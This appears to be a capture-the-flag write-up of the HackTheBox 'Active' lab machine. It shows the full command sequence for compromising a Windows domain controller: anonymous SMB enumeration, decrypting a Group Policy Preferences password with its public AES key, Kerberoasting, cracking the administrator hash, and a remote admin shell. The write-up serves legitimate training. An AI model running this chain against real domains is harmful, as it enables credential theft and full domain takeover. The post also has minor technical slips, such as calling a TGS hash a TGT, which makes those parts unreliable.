---
image: "/assets/img/posts/Manager-4_601a74ae96.png"
title: "Active Hackthebox"
description: "The Active Machine was an example of"
pubDate: "2024-05-16"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


### Recon





Like any other Machine, I start with a basic scan





  `








```bash


└─# nmap 10.129.9.50                             


Host is up (0.40s latency).


Not shown: 983 closed tcp ports (reset)


PORT      STATE SERVICE


53/tcp    open  domain


88/tcp    open  kerberos-sec


135/tcp   open  msrpc


139/tcp   open  netbios-ssn


389/tcp   open  ldap


445/tcp   open  microsoft-ds


464/tcp   open  kpasswd5


593/tcp   open  http-rpc-epmap


636/tcp   open  ldapssl


3268/tcp  open  globalcatLDAP


3269/tcp  open  globalcatLDAPssl


49152/tcp open  unknown


49153/tcp open  unknown


49154/tcp open  unknown


49155/tcp open  unknown


49157/tcp open  unknown


49158/tcp open  unknown





```


`





My second scan which will index all the ports open on the Machines and also the -sC flag to have more possible information





  `








```bash


nmap -sV -sC -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,49153-49158 $ip


Host is up (0.47s latency).





PORT      STATE  SERVICE       VERSION


53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)


| dns-nsid: 


|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)


88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-22 14:32:28Z)


135/tcp   open   msrpc         Microsoft Windows RPC


139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn


389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)


445/tcp   open   microsoft-ds?


464/tcp   open   kpasswd5?


593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0


636/tcp   open   tcpwrapped


3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)


3269/tcp  open   tcpwrapped


49153/tcp open   msrpc         Microsoft Windows RPC


49154/tcp open   msrpc         Microsoft Windows RPC


49155/tcp open   msrpc         Microsoft Windows RPC


49156/tcp closed unknown


49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0


49158/tcp open   msrpc         Microsoft Windows RPC


Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows





Host script results:


|_clock-skew: 1s


| smb2-security-mode: 


|   210: 


|_    Message signing enabled and required


| smb2-time: 


|   date: 2024-02-22T14:33:30


|_  start_date: 2024-02-22T14:24:47





```


`


## Analyse





With port 88 being Kerberoas, then I tell myself that I am 90% certain that I am in an Active Directory. Port 139 and 445 are open which gives me a multitude of ideas of attack on the smb Thus port 389 and 636 which mindex the LDAP Also lastly I find the domain active.htb and the Domain Controller DC.active.htb as well as the system in question windows_server_2008





With this analysis I will start my pentest on the smb by trying to do some enumeration of share `








```bash


──(root㉿hacker101)-[/home/MrR0807/Github/RED-TEAM/Win_Boxes]


└─# smbmap -H 10.129.9.50





    ________  ___      ___  _______   ___      ___       __         _______


   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\


  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)


   \___  \    /\  \/.    ||:     \/   /\   \/.    |   / /\  \     |:  ____/


    __/  \   |: \.        |(|  _  \  |: \.        |  //  __  \    (|  /


   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \


  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)


 -----------------------------------------------------------------------------


     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com


                     https://github.com/ShawnDEvans/smbmap





[*] Detected 1 hosts serving SMB


[*] Established 1 SMB session(s)                                


                                                                                                    


[+] IP: 10.129.9.50:445 Name: active.htb                Status: Authenticated


        Disk                                                    Permissions     Comment


        ----                                                    -----------     -------


        ADMIN$                                                  NO ACCESS       Remote Admin


        C$                                                      NO ACCESS       Default share


        IPC$                                                    NO ACCESS       Remote IPC


        NETLOGON                                                NO ACCESS       Logon server share 


        Replication                                             READ ONLY


        SYSVOL                                                  NO ACCESS       Logon server share 


        Users                                                   NO ACCESS





```


`





To get started, I used the smbmap -H $ip tool to list anonymously accessible shares. This tells me that I have the right to read the Replication share. So with that I can use smbclient to read this Folder.





Je pourrais aussi utiliser crackmapexec oubien plus encore netexec  `








```bash


└─# crackmapexec smb 10.129.9.50 -u  -p 


SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)


SMB         10.129.9.50     445    DC               [+] active.htb\:





```


`





This first crackmapexec command confirms that anonymous access is available.





  `








```bash


└─# crackmapexec smb 10.129.9.50 -u  -p  --shares


SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)


SMB         10.129.9.50     445    DC               [+] active.htb\: 


SMB         10.129.9.50     445    DC               [+] Enumerated shares


SMB         10.129.9.50     445    DC               Share           Permissions     Remark


SMB         10.129.9.50     445    DC               -----           -----------     ------


SMB         10.129.9.50     445    DC               ADMIN$                          Remote Admin


SMB         10.129.9.50     445    DC               C$                              Default share


SMB         10.129.9.50     445    DC               IPC$                            Remote IPC


SMB         10.129.9.50     445    DC               NETLOGON                        Logon server share 


SMB         10.129.9.50     445    DC               Replication     READ            


SMB         10.129.9.50     445    DC               SYSVOL                          Logon server share 


SMB         10.129.9.50     445    DC               Users





```


`





Now, I will use another smbclient tool to access the file to which I have read rights





  `








```bash


└─# smbclient -N \\\\10.129.9.50/Replication


Anonymous login successful


Try "help" to get a list of possible commands.


smb: \> dir


  .                                   D        0  Sat Jul 21 10:37:44 2018


  ..                                  D        0  Sat Jul 21 10:37:44 2018


  active.htb                          D        0  Sat Jul 21 10:37:44 2018





                5217023 blocks of size 4096. 284724 blocks available


smb: \>





```


`





With this anonymous access, I will search through all the available files and see if I will come across sensitive information. So first I download everything to my Local machine.





  `








```bash


smb: \> recurse on


smb: \> prompt off


smb: \> mget *


getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)


getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)


getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)


getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.9 KiloBytes/sec) (average 1.0 KiloBytes/sec)


getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.8 KiloBytes/sec) (average 0.9 KiloBytes/sec)


getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.6 KiloBytes/sec) (average 1.0 KiloBytes/sec)


getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (4.0 KiloBytes/sec) (average 1.5 KiloBytes/sec)


smb: \>





```


`





I'm going to make a tree to see the files, Folders, and under Folders that are inside





  `








```bash


└─# tree                   


.


└── active.htb


    ├── DfsrPrivate


    │   ├── ConflictAndDeleted


    │   ├── Deleted


    │   └── Installing


    ├── Policies


    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}


    │   │   ├── GPT.INI


    │   │   ├── Group Policy


    │   │   │   └── GPE.INI


    │   │   ├── MACHINE


    │   │   │   ├── Microsoft


    │   │   │   │   └── Windows NT


    │   │   │   │       └── SecEdit


    │   │   │   │           └── GptTmpl.inf


    │   │   │   ├── Preferences


    │   │   │   │   └── Groups


    │   │   │   │       └── Groups.xml


    │   │   │   └── Registry.pol


    │   │   └── USER


    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}


    │       ├── GPT.INI


    │       ├── MACHINE


    │       │   └── Microsoft


    │       │       └── Windows NT


    │       │           └── SecEdit


    │       │               └── GptTmpl.inf


    │       └── USER


    └── scripts





```


`


## Analyse





In these folders I end up finding an important file which is Groups.xml. Often it is a file which contains the Group Policy Password Preferences. Group Policy Preferences is a collection of client-side Group Policy extensions that provide preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems.





https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a





Let's read this file





  `








```bash


└─# cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 








```


`





In this file I see a cpassword which is encrypted. By the way For protection, Microsoft encrypts the password using AES before it is stored as a cpassword. But the keys are publicly available on MSDN!





## Decryptage





On specifie que les clé de dechiffrement sont souvent disponible publiquement.





Tous les passwords sont cryptés à laide dune clé AES (Advanced Encryption Standard). La clé AES de 32 octets est la suivante :  `








```bash


4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8


f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b





```


`





We can use a tool to decrypt it called gpp-decrypt





  `








```bash


└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"


GPPstillStandingStrong2k18





```


`





Here is the tool gives us the password in plain text, Well in this same Groups.xml we see a line userName="active.htb\SVC_TGS" which specifies the user to whom this password belongs.





## Analyse





Now, we have a user and a password, so what can we do? First we can see if winrm is open in port 5985





  `








```bash


─# nc -nv $ip 5985


(UNKNOWN) [10.129.9.50] 5985 (?) : Connection refused





```


`





It's not open, so the second option is to see if this user exists in the smb with crackmapexec





  `








```bash


┌──(root㉿hacker101)-[/home/…/CTFs/Boot2root/HacktheBox/VIP]


└─# crackmapexec smb 10.129.9.50 -u SVC_TGS -p GPPstillStandingStrong2k18


SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)


SMB         10.129.9.50     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18





```


`





We have confirmation that this user does exist. So what to do? I will first list the shares that this user can READ.





  `








```bash


└─# crackmapexec smb 10.129.9.50 -u SVC_TGS -p GPPstillStandingStrong2k18 --shares


SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)


SMB         10.129.9.50     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 


SMB         10.129.9.50     445    DC               [+] Enumerated shares


SMB         10.129.9.50     445    DC               Share           Permissions     Remark


SMB         10.129.9.50     445    DC               -----           -----------     ------


SMB         10.129.9.50     445    DC               ADMIN$                          Remote Admin


SMB         10.129.9.50     445    DC               C$                              Default share


SMB         10.129.9.50     445    DC               IPC$                            Remote IPC


SMB         10.129.9.50     445    DC               NETLOGON        READ            Logon server share 


SMB         10.129.9.50     445    DC               Replication     READ            


SMB         10.129.9.50     445    DC               SYSVOL          READ            Logon server share 


SMB         10.129.9.50     445    DC               Users           READ





```


`





With this I will go to the users folder





  `








```bash


└─# smbclient \\\\10.129.9.50/Users -U SVC_TGS%GPPstillStandingStrong2k18


Try "help" to get a list of possible commands.


smb: \> dir


  .                                  DR        0  Sat Jul 21 14:39:20 2018


  ..                                 DR        0  Sat Jul 21 14:39:20 2018


  Administrator                       D        0  Mon Jul 16 10:14:21 2018


  All Users                       DHSrn        0  Tue Jul 14 05:06:44 2009


  Default                           DHR        0  Tue Jul 14 06:38:21 2009


  Default User                    DHSrn        0  Tue Jul 14 05:06:44 2009


  desktop.ini                       AHS      174  Tue Jul 14 04:57:55 2009


  Public                             DR        0  Tue Jul 14 04:57:55 2009


  SVC_TGS                             D        0  Sat Jul 21 15:16:32 2018





```


`


## Privilege Escalation





Well here we just had the user flag, so the last thing to do is to root the box and become Domain Admin. The thing I'm going to try to do is enumerate the users, Next, with these users I'm going to try to do the kerberoasting attack, to find users who have Pre-authentication access





  `








```bash


└─# crackmapexec smb 10.129.9.50 -u SVC_TGS -p GPPstillStandingStrong2k18 --rid-brute 10000


SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)


SMB         10.129.9.50     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 


SMB         10.129.9.50     445    DC               [+] Brute forcing RIDs


SMB         10.129.9.50     445    DC               498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)


SMB         10.129.9.50     445    DC               500: ACTIVE\Administrator (SidTypeUser)


SMB         10.129.9.50     445    DC               501: ACTIVE\Guest (SidTypeUser)


SMB         10.129.9.50     445    DC               502: ACTIVE\krbtgt (SidTypeUser)


SMB         10.129.9.50     445    DC               512: ACTIVE\Domain Admins (SidTypeGroup)


SMB         10.129.9.50     445    DC               513: ACTIVE\Domain Users (SidTypeGroup)


SMB         10.129.9.50     445    DC               514: ACTIVE\Domain Guests (SidTypeGroup)


SMB         10.129.9.50     445    DC               515: ACTIVE\Domain Computers (SidTypeGroup)


SMB         10.129.9.50     445    DC               516: ACTIVE\Domain Controllers (SidTypeGroup)


SMB         10.129.9.50     445    DC               517: ACTIVE\Cert Publishers (SidTypeAlias)


SMB         10.129.9.50     445    DC               518: ACTIVE\Schema Admins (SidTypeGroup)


SMB         10.129.9.50     445    DC               519: ACTIVE\Enterprise Admins (SidTypeGroup)


SMB         10.129.9.50     445    DC               520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)


SMB         10.129.9.50     445    DC               521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)


SMB         10.129.9.50     445    DC               553: ACTIVE\RAS and IAS Servers (SidTypeAlias)


SMB         10.129.9.50     445    DC               571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)


SMB         10.129.9.50     445    DC               572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)


SMB         10.129.9.50     445    DC               1000: ACTIVE\DC$ (SidTypeUser)


SMB         10.129.9.50     445    DC               1101: ACTIVE\DnsAdmins (SidTypeAlias)


SMB         10.129.9.50     445    DC               1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)


SMB         10.129.9.50     445    DC               1103: ACTIVE\SVC_TGS (SidTypeUser)





```


`





Well here I already have all the users. Also port 135 is open, We can also have all the users





  `








```bash


└─# rpcclient -U "SVC_TGS" 10.129.9.50 


Password for [WORKGROUP\SVC_TGS]:


rpcclient $> enumdomusers


user:[Administrator] rid:[0x1f4]


user:[Guest] rid:[0x1f5]


user:[krbtgt] rid:[0x1f6]


user:[SVC_TGS] rid:[0x44f]


rpcclient $>





```


`Kerberoasting Kerberoasting is an attack method that attempts to obtain plaintext passwords from Kerberos tickets of service accounts. One way to assign service accounts is to use an attribute called a service principal name (SPN), which links a service to a user account. To do this, I will use Impacket's GetUsersSPNs for this attack. But first I will check with kerbrute if these users already have a kerberoas account with the kerbrute tool `








```bash


└─# kerbrute userenum --dc 10.129.9.50 -d active.htb users.txt 





    __             __               __     


   / /_____  _____/ /_  _______  __/ /____ 


  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \


 / ,  Using KDC(s):


2024/02/22 15:26:54 >   10.129.9.50:88





2024/02/22 15:26:54 >  [+] VALID USERNAME:       SVC_TGS@active.htb


2024/02/22 15:26:54 >  [+] VALID USERNAME:       Administrator@active.htb





```


`





As kerbrute confirms, we only have 2 users who have these valid Kerberoas accounts, so I will remove the others and continue with the GetUsersSPNs tool for Kerberoasting, but I already have access to the SVC_TGS, so I only have one user left which is the Administrator





  `








```bash


└─# impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -usersfile users.txt 


Impacket v0.11.0 - Copyright 2023 Fortra





[-] CCache file is not found. Skipping...


$krb5tgs$23$*Administrator$ACTIVE.HTB$Administrator*$0e681bad7613234f88f0e1e614a8f79e$4f3ef9e39b081143e47d83ddbecb75cd0a0091b22d991dbd3a96fbf0f97a2e70f49580e3cd76eac94c5ef8587929c1a6b6438f7380f3fc1be3ff5d09cdaabe074ed486399dfddc4bc6cdfd1ee4368bc748f2625d742fe7fc110ed2ba1dbf7db74c157a9c0df7c350553d0582f32c0d1c5cd9e02825b2daa65cff7e405457f45bc04d68cebb616dabd5207537ec4e5b655f09c20c5817c057b626ed1b7d6cea7b06e21365e62f9c60cd28d481ddcdc7a4f766f0ccecabfbe633e2e34b5c8a2a1d2233064ab5491f8ddb85967f5be0237db58549e9c283707a09b694c7f3d2e003dd1e5986d6afcff039919647cf9d0151016e0e9ef02ab4dd4b14b4bfbf15c4f4664f1ef554a82883ca431a8a90af3450e457e8af0eaae65147ff46d532c8e215802dc7990767f154d495c046a0375947ae49302a53fcb9dac8c04bb738677640810dacff06575974b126e4532cec074cb0ec7b6b024e4a7bb47d0ce5ab31a5bb1c876ae63781b35695aa92233779f718fd5f8fd99a3b0138d10916be62e3d9eeb93001f8d98d0385b3b884f3fbb92331805b95ecc0b8b2c7db24d8792ad75121485b1f229f685b349d30fa3becbbc1da4fcb81b551a309d8d93d32092797d3211f0da30533a38a6c19803757b1459045f20d107c1cdcb1bff21ae487225b7e9178617e20ad33479f799d1c5769ffeb2b37867b1fb5902472c21a35c395adf00d80396e0dc5da0ac468f7554fc30e6a155001a680e7945c2ce0f2a6315a3f144f7959a0d979acb185ee7d8bca0ece5076f95bb3664b21327fb5bd18da3eea9330a9ca6f5482191457af6e6205f1c3f84f6bd2aedf10250ac2ff31b32fbcd11875bd9516f2acdecbe80d1f762f555b2e47c83924ba7d7946f4edc9df9ba71fecf0dc153c585f6638007d0c43a81fde64a1f53313810c6fbbc487075ba75b2473bb9e80810f658f776aaaff9e47622e5408729b533f528a8b6142a72ddace48c184ef3a44a680b73689e78561d6ca107ead7243a35d12304495909c932b91c752f21385963855084e0319d3e9c9ed9f8849784ba2633f85d600e12457216a2fa30a52cb0751ec67eebf44965269aca35e0126bd9ae01e34f1460702cdc5783a463c8a0649d6211a984e23f4bc577e98b9aecbed348283c1bfa520fc17c406bdeb0104142c80ffcf7bc10f4b611e12cecff1012793ce23cfd995b7a8f34c96cc719cc212475154b8e3c5c1de82699715cce099a0a787ddaaf19db735





```


`





With success we obtain the TGT from the admin, Now, all that remains is the cracker with john or hashcat





  `








```bash


└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 


Using default input encoding: UTF-8


Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])


Will run 4 OpenMP threads


Press q or Ctrl-C to abort, almost any other key for status


Ticketmaster1968 (?)     


1g 0:00:00:10 DONE (2024-02-22 15:32) 0.09891g/s 1042Kp/s 1042Kc/s 1042KC/s Tiffani1432..Thrash1


Use the "--show" option to display all of the cracked passwords reliably


Session completed.





```


`





We still have another user and a password, but what to do?





## Analyse





let's go back to basic and try crackmapexec first





  `








```bash


└─# crackmapexec smb 10.129.9.50 -u Administrator -p Ticketmaster1968                


SMB         10.129.9.50     445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)


SMB         10.129.9.50     445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)





```


`





We have a (Pwn3d!) which means we have total control over this Box (Domain Admin). Lets dump. let's dump the hashes and try the Pass-The-hash attack





  `








```bash


└─# crackmapexec smb 10.129.9.50 -u Administrator -p Ticketmaster1968 --ntds





```


`





Or use this password to connect with wmiexec from impacket and read the root.txt flag





  `








```bash


└─# impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.129.9.50


Impacket v0.11.0 - Copyright 2023 Fortra





[*] SMBv2.1 dialect used


[!] Launching semi-interactive shell - Careful what you execute


[!] Press help for extra shell commands


C:\>dir


 Directory of C:\





14/07/2009  05:20 ��              PerfLogs


12/01/2022  03:11 ��              Program Files


21/01/2021  06:49 ��              Program Files (x86)


21/07/2018  04:39 ��              Users


22/02/2024  05:39 ��              Windows


               0 File(s)              0 bytes


 Directory of C:\Users\administrator\Desktop





21/01/2021  06:49 ��              .


21/01/2021  06:49 ��              ..


22/02/2024  04:25 ��                34 root.txt


               1 File(s)             34 bytes


               2 Dir(s)   1.126.309.888 bytes free





C:\Users\administrator\Desktop>type root.txt


10d64997a058c15378561f81c2aa6b42





C:\Users\administrator\Desktop>


C:\Users\administrator\Desktop>systeminfo


[-] Decoding error detected, consider running chcp.com at the target,


map the result with https://docs.python.org/3/library/codecs.html#standard-encodings


and then execute wmiexec.py again with -codec and the corresponding codec





Host Name:                 DC


OS Name:                   Microsoft Windows Server 2008 R2 Standard 


OS Version:                6.1.7601 Service Pack 1 Build 7601


OS Manufacturer:           Microsoft Corporation


OS Configuration:          Primary Domain Controller


OS Build Type:             Multiprocessor Free


Registered Owner:          Windows User


Registered Organization:   


Product ID:                55041-507-9857321-84027


Original Install Date:     16/7/2018, 1:13:22 ��


System Boot Time:          22/2/2024, 4:24:27 ��


System Manufacturer:       VMware, Inc.


System Model:              VMware Virtual Platform


System Type:               x64-based PC


Processor(s):              1 Processor(s) Installed.


                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz


BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020


Windows Directory:         C:\Windows


System Directory:          C:\Windows\system32


Boot Device:               \Device\HarddiskVolume1


System Locale:             el;Greek


Input Locale:              en-us;English (United States)


Time Zone:                 (UTC+02:00) Athens, Bucharest


Total Physical Memory:     6.143 MB


Available Physical Memory: 5.412 MB


Virtual Memory: Max Size:  11.092 MB





```


`


## Ressources supplementaires





Here are some additional resources that you might find helpful: [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)





[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=Active%20-%20HacktheBox(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Factive-hackthebox%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Active%20-%20HacktheBox(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Factive-hackthebox%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Factive-hackthebox%2F&text=Active%20-%20HacktheBox(Easy)%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Factive-hackthebox%2F)


